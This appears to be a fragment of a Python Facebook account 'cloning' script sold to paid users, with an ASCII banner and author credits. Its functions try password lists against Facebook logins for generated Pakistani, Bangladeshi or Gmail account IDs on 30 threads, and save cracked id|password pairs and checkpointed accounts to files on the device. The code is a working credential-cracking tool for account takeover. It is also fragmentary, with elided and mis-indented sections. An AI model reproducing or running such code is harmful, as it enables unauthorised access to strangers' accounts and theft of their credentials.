...
import os,base64
os.system('xdg-open https://www.facebook.com/profile.php?id=100088017854523')
...
\033[1;32m$$  __$$\ $$ |  $$ |$$  __$$\ $$$\  $$ |$$  __$$\ 
\033[1;32m$$ /  \__|$$ |  $$ |$$ /  $$ |$$$$\ $$ |$$ |  $$ |
\033[1;32m$$ |      $$$$$$$$ |$$$$$$$$ |$$ $$\$$ |$$ |  $$ |\033[1;35mP\033
\033[1;32m$$ |      $$  __$$ |$$  __$$ |$$ \$$$$ |$$ |  $$ |\033[1;31mR\033[1;37m
\033[1;32m$$ |  $$\ $$ |  $$ |$$ |  $$ |$$ |\$$$ |$$ |  $$ |\033[1;34mO\033[1;37m
\033[1;32m\$$$$$$  |$$ |  $$ |$$ |  $$ |$$ | \$$ |$$$$$$$  |
\033[1;32m\______/ \__|  \__|\__|  \__|\__|  \__|\_______/                                                                    
      NAME HOGA"🤣 BADNAME TO HONGA" 😈
\033[1;93m--------------------------------------------------
\033[1;95m[-] AUTHOR    :\033[1;32m RAFI ULLAH
\033[1;95m[-] BROTHER:    \033[1;32mZEESHAN BALOCH
\033[1;95m[-] VERSION   :\033[1;32m 3.4
---------------------------------------------------  
     \033[1;91m Dear Paid user:
\033[1;32mFEEL THE POWER "CHAND""
---------------------------------------""")
def linex():
	print('\033[1;32m----------------------------------------------')
def clear():
...
def auto_file(cookies,access_token):
    ...
    print('\n \033[1;35m /sdcard/VEER.txt \033[0;97m\n')
...
def manual_file(cookies,access_token):
    ...
    try:
        ...
        limit = 1
    print('\n \033[1;32mExample: /sdcard/VEER.txt \033[0;97m\n')
...
def sids():
    ...
    print('\n\033[1;32m Example: /sdcard/VEER.txt\033[0;97m')
...
def menu(): 
	...
	if xd in ['1','01']:
		...
		clear()
		print('\033[1;96m [1] Pakistan cloning\n [2] Bangladesh cloning\n [3] gmail cloning\n [0] Back menu')
		linex()
		x=input(' Choose: ')
		if x in ['1','01']:
			pak()
	   ...
	   gmail()
		...
		os.system(f'xdg-open https://wa.me/+923411343160');menu()
...
def pak():
		...
		code = input('\033[1;96mput code: ')
		try:
			limit = int(input('\033[1;95m example: 2000, 3000, 5000, 10000\n\033[1;91m put limit: '))
		except ValueError:
			limit = 5000
		linex()
		print(' [1] Method 1\n [2] Method 2 Best ')
		...
		with tred(max_workers=30) as AXI:	
			...
			print(f'\033[1;32m \033[1;95m you Show no result use flight mode\033[1;97m')
			linex()
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;32m [RAFI ULLAH] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;96m [CHAND-OK] %s | %s'%(ids,pas))
				open('/sdcard/VEER-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\033[1;96m [CHAND-CP] '+ids+' | '+pas+'\033[1;96m')
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				...
				open('/sdcard/VEER-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\033[1;96m  [CHAND-CP] '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/VEER-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
...
def rcrack(ids,passlist):
	...
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;32m [RAFI ULLAH] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [CHAND-OK] '+ids+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [CHAND-OK] '+ids+' | '+pas)
				...
				if uid in cps:pass
					...
					print('\r\r\x1b[38;5;208m [CHAND-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/VEER-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
